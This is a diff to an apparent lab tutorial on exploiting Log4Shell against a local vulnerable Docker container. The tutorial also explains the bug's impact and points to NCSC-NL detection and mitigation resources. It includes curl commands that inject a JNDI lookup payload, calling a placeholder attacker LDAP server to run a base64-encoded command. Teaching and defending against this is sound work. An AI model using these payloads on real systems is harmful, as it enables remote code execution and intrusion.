@@ -103,12 +103,47 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/C
 
 > **NOTE:** This can also be used *BurpSuite* by adding the following line to the origal reqest: 
 > ```http
-> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 > ```
 
+Now you can execute any command you want. 
+
+## Why this was such a big deal
+
+The process we just did was very manual but a bot can easily be set up to do this. This is exactly what happened when the vulnerabilty was discovered. There were at least 10 major botnets were doing masscans for *Log4J* [^2]. Once you have all the vulnerable machines, you can then create a program that does remote code exicution on the targets. 
+## Are you suffereing from *Log4J*? 
+
+One of the best resources for *Log4J* is [`NCSC-NL/log4shell` GitHub Page](https://github.com/NCSC-NL/log4shell). It contains detailed documentation on: 
+
+- Hunting
+- Indicators of Compromise
+- Detection & Mitigation
+- Scanning 
+- Known Vulnerable Software
+- Parsing Tools
+
+We will be using 2 tools mentioned in this repository. 
+
+### 1. [log4j-finder](https://github.com/fox-it/log4j-finder)
 
 ## Sources  
 
-- https://github.com/NCSC-NL/log4shell
+### Directly Used
+
+- [`NCSC-NL/log4shell` GitHub Page](https://github.com/NCSC-NL/log4shell)
+
+### Tools 
+
+- 
+
+### Good to Know
+
+- 
+
+### Honorable Mentions 
+
+- 
+
 
 [^1]: [Docker container created by christophetd](https://github.com/christophetd/log4shell-vulnerabre-app) 
+[^2]: [Ten families of malicious samples are spreading using the Log4j2 vulnerability Now](https://blog.netlab.360.com/ten-families-of-malicious-samples-are-spreading-using-the-log4j2-vulnerability-now/) 
